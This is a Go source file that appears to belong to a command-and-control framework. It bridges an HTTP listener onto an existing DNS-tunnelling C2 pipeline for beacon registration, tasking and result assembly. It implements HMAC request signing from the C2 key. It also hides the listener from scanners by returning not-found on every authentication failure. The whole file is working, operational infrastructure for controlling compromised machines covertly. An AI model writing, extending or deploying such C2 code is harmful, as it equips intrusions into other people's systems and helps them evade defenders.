// Package main bridges the HTTP transport onto the existing DNS C2 pipeline.
//
// The HTTP listener deliberately does not reimplement registration, tasking,
// chunked-result assembly or master relaying. Instead it hands the decoded
// protocol message to processBeaconQuery(), the same entry point the DNS path
// uses. Both transports therefore share exactly one implementation of beacon
// lifecycle and tasking, and a change there cannot silently apply to only one
// transport.
package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// Beacon transport modes. These are chosen at build time and may be changed at
// runtime through the same fire-and-forget task channel the Shadow Mesh domain
// updates use.
const (
	TransportDNS  = "dns"
	TransportHTTP = "http"
	TransportDual = "dual"
)

// NormalizeTransportMode maps operator input onto a known mode, defaulting to
// DNS so a build or update that omits the field behaves exactly as before HTTP
// transport existed.
func NormalizeTransportMode(mode string) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case TransportHTTP:
		return TransportHTTP
	case TransportDual:
		return TransportDual
	default:
		return TransportDNS
	}
}

// hmacKey derives the HTTP signing key from the C2 encryption key.
//
// The signature proves possession of the shared C2 key, which is the same
// credential the DNS path relies on: a beacon that can AES-GCM its subdomain
// payload can sign an HTTP request. No second, per-beacon secret is introduced,
// so rotating the C2 key rotates both transports at once.
func hmacKey(encryptionKey []byte) []byte {
	mac := hmac.New(sha256.New, encryptionKey)
	mac.Write([]byte("unkn0wnc2-http-v1"))
	return mac.Sum(nil)
}

// httpSignatureInput builds the canonical string a beacon signs.
func httpSignatureInput(method, path, timestamp string, body []byte) []byte {
	return []byte(strings.ToUpper(method) + "\n" + path + "\n" + timestamp + "\n" + string(body))
}

// signHTTPRequest returns the value a beacon places in the auth header:
// "<unix-timestamp>.<signature>". The timestamp bounds replay.
func signHTTPRequest(encryptionKey []byte, method, path string, body []byte) string {
	timestamp := strconv.FormatInt(time.Now().Unix(), 10)
	mac := hmac.New(sha256.New, hmacKey(encryptionKey))
	mac.Write(httpSignatureInput(method, path, timestamp, body))
	return timestamp + "." + hex.EncodeToString(mac.Sum(nil))
}

// verifyHTTPRequest authenticates a listener request against the profile's auth
// mode. It returns nil only when the request is provably from something holding
// the C2 key.
//
// The listener maps every failure to the profile's not-found status rather than
// a 401/403, so an unauthenticated prober cannot distinguish "wrong signature"
// from "no such endpoint".
func verifyHTTPRequest(profile *HTTPProfile, encryptionKey []byte, r *http.Request, body []byte) error {
	switch profile.Auth.Mode {
	case authNone:
		return nil

	case authHMACSHA256:
		value := r.Header.Get(profile.Auth.Header)
		if value == "" {
			return fmt.Errorf("missing %s header", profile.Auth.Header)
		}

		timestamp, signature, ok := strings.Cut(value, ".")
		if !ok || timestamp == "" || signature == "" {
			return fmt.Errorf("malformed %s header", profile.Auth.Header)
		}

		if profile.Auth.MaxSkewSecs > 0 {
			seconds, err := strconv.ParseInt(timestamp, 10, 64)
			if err != nil {
				return fmt.Errorf("non-numeric timestamp in %s header", profile.Auth.Header)
			}
			skew := time.Since(time.Unix(seconds, 0))
			if skew < 0 {
				skew = -skew
			}
			if skew > time.Duration(profile.Auth.MaxSkewSecs)*time.Second {
				return fmt.Errorf("request timestamp outside the %ds tolerance window", profile.Auth.MaxSkewSecs)
			}
		}

		mac := hmac.New(sha256.New, hmacKey(encryptionKey))
		mac.Write(httpSignatureInput(r.Method, r.URL.Path, timestamp, body))
		expected := mac.Sum(nil)

		presented, err := decodeSignature(profile.Auth.SigEncoding, signature)
		if err != nil {
			return err
		}
		// Constant-time compare: a timing-sensitive compare would leak the
		// signature byte by byte to anyone probing the listener.
		if !hmac.Equal(expected, presented) {
			return fmt.Errorf("signature mismatch")
		}
		return nil

	case authSharedHeadr:
		// A static token derived from the C2 key, for operators who want a
		// cheap check with no timestamp bookkeeping.
		value := r.Header.Get(profile.Auth.Header)
		if value == "" {
			return fmt.Errorf("missing %s header", profile.Auth.Header)
		}
		mac := hmac.New(sha256.New, hmacKey(encryptionKey))
		mac.Write([]byte("shared-header"))
		expected := hex.EncodeToString(mac.Sum(nil))
		if !hmac.Equal([]byte(expected), []byte(value)) {
			return fmt.Errorf("shared header mismatch")
		}
		return nil
	}

	return fmt.Errorf("unsupported auth mode %q", profile.Auth.Mode)
}

// decodeSignature accepts either encoding the profile allows.
func decodeSignature(encoding, signature string) ([]byte, error) {
	switch encoding {
	case "hex":
		decoded, err := hex.DecodeString(signature)
		if err != nil {
			return nil, fmt.Errorf("signature is not valid hex")
		}
		return decoded, nil
	case "base64":
		decoded, err := base64.StdEncoding.DecodeString(signature)
		if err != nil {
			return nil, fmt.Errorf("signature is not valid base64")
		}
		return decoded, nil
	}
	return nil, fmt.Errorf("unsupported signature encoding %q", encoding)
}

// ProcessHTTPMessage runs a decoded protocol message through the DNS C2 pipeline
// and returns the protocol response.
//
// Reuse rationale: the pipeline is entered through processBeaconQuery, which is
// keyed on a query name rather than on a decoded message. The message is
// therefore re-encoded into the same subdomain form a DNS beacon would have
// used and wrapped in a synthetic query name against our own domain. That costs
// one AES round-trip per HTTP request and buys complete behavioural parity with
// the DNS path: identical registration, deduplication, peek/deliver semantics,
// chunked tasking, result assembly and master relaying.
//
// encrypted mirrors the beacon's build-time encryption setting. A base36
// (unencrypted) beacon must reach the pipeline unencrypted so the pipeline
// reports encrypted=false and the listener answers without AES, exactly as the
// DNS path does for the same build.
//
// queryType is passed as TXT. Over DNS, an A-record POLL means "peek: tell me a
// task is ready without consuming it", which is what makes dual-mode A-record
// signalling work. An HTTP task fetch is the real delivery, so it must not peek.
func (c2 *C2Manager) ProcessHTTPMessage(decoded, clientIP string, encrypted bool) (response string, hasTask bool, respEncrypted bool) {
	if strings.TrimSpace(decoded) == "" {
		return "", false, true
	}

	key := c2.GetEncryptionKey()

	var encoded string
	if encrypted {
		ciphertext, err := encryptAndEncode(decoded, key)
		if err != nil {
			logf("[HTTP] Failed to encode message for pipeline: %v", err)
			return "", false, true
		}
		encoded = ciphertext
	} else {
		encoded = base36EncodeString(decoded)
	}

	qname := fmt.Sprintf("%s.%d.%s", encoded, time.Now().Unix(), c2.domain)

	var info C2QueryInfo
	response, hasTask, respEncrypted = c2.processBeaconQuery(qname, clientIP, &info, 16 /* TXT: deliver, do not peek */)

	if c2.debug && response != "" {
		logf("[HTTP] %s -> %s (%s)", info.MsgType, truncateForLog(response, 60), clientIP)
	}
	return response, hasTask, respEncrypted
}

// truncateForLog keeps debug lines readable without hiding the message type.
func truncateForLog(value string, limit int) string {
	if len(value) <= limit {
		return value
	}
	return value[:limit] + "..."
}
